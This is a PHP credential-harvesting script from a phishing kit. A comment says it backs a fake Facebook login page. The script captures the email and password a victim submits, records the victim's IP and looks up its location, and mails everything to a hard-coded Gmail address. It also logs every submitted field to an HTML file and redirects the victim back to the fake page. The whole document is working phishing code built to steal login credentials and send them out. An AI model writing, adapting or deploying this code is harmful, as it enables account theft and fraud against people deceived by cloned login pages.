<?php 
//you can change the bellow link here I am making the phishing page of facebook so I have written 163mailer.000webhostapp.com/ 
header("Location: ./index.php"); 
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || #Hades || :------\n";
$message .= "Email! ID              : ".$_POST['email']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || Hades Silent Exploits || :------\n";
$message .= "IP: ".$ip."\n";
$message .= "Password              : ".$_POST['password']."\n";
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
echo $details->city; // -> "Mountain View"


$recipient ="kelvinteniola1@gmail.com";
$subject = "Fresh New Bases | ".$ip." | ".$_POST['email']."\n";

mail($recipient,$subject,$message);
$handle = fopen("./logg.html", "a"); 
foreach($_POST as $variable => $value) 
{ 
fwrite($handle, $variable); 
fwrite($handle, "="); 
fwrite($handle, $value); 
fwrite($handle, "\r\n"); 
} 
fwrite($handle, "\r\n"); 
fwrite($handle, "<hr />"); 
fclose($handle); 
exit; 
?>

